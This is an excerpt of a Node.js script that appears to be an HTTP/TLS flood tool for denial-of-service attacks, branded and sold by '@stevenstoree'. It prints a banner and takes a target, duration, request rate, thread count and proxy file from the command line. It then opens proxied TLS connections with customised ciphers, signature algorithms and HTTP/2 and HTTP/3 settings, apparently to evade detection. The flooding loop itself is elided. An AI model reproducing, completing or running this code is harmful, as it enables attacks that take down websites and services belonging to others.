...
if (cluster.isMaster) {
    console.clear();
    console.log(`@stevenstoree`.bgRed), console.log(`DILARANG KERAS MAKAI METHODS INI`);
    console.log(`--------------------------------------------`.gray);
    console.log(`BUY PV @stevenstoree`.gray);
    console.log(`YT @steven-not-pro`.gray);
    console.log(`Target: `.red + process.argv[2].blue);
    console.log(`Time: `.red + process.argv[3].blue);
    console.log(`Rate: `.red + process.argv[4].blue);
    console.log(`Thread: `.red + process.argv[5].blue);
    console.log(`ProxyFile: `.red + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: PUNYA STEVEN•STORE🕊🪽 TIDAK BOLEH DI RINEM`.brightCyan);
...
Socker.HTTP(proxyOptions, async (connection, error) => {
    ...
    const tlsOptions = {
        secure: true,
        ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1'],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
